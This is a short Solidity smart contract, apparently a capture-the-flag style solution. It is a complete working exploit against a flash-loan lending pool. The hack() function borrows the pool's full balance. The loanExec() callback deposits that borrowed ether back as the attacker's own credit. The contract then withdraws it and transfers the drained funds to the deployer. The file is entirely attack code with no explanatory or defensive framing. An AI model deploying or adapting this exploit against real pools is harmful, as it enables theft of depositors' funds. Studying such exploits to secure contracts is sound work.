// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IFlashLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

interface IReceiver {
    function loanExec() external payable;
}

contract FlashLoanReentrancyExploit is IReceiver {
    IFlashLenderPool immutable myPool;
    uint immutable poolBalanceEth;
    address payable immutable hackAddr = payable(msg.sender);
    constructor(address _myPool, uint _poolBalanceEth) {
        myPool = IFlashLenderPool(_myPool);
        poolBalanceEth = _poolBalanceEth;
    }

    function hack() external {
        myPool.flashLoan(poolBalanceEth);
        myPool.withdraw();
        hackAddr.transfer(address(this).balance);
    }

    function loanExec() external payable override {
        myPool.deposit{value:msg.value}();
    }

    receive() external payable {}
}